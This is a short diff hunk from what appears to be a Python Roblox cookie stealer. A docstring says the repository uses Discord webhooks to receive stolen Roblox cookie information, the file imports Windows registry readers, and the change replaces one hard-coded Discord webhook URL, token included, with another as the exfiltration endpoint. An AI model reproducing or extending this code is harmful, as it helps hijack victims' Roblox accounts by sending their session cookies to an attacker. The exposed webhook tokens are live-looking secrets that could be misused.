@@ -11,7 +11,7 @@ from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
 This repository uses Discord Webhooks to receive roblox cookie's information
 Replace 'webhook' with your discord webhook
 '''
-wbh = "https://discord.com/api/webhooks/1166820585133850767/AB2ei2y7VyoZ0jO6AQ2xxnb7lmMK2R60vaxOqql9DOaz08-66XvKYlpTI2XgAfg7OsQN"
+wbh = "https://discord.com/api/webhooks/1170798995233325208/O0BnPRSyx7n-0IMIcs3e7eigMp178YapOZ6bxWHMeOf48PggkFu5jzdLrgl8UT5HazGa"
 
 class RobloxInfo:
 
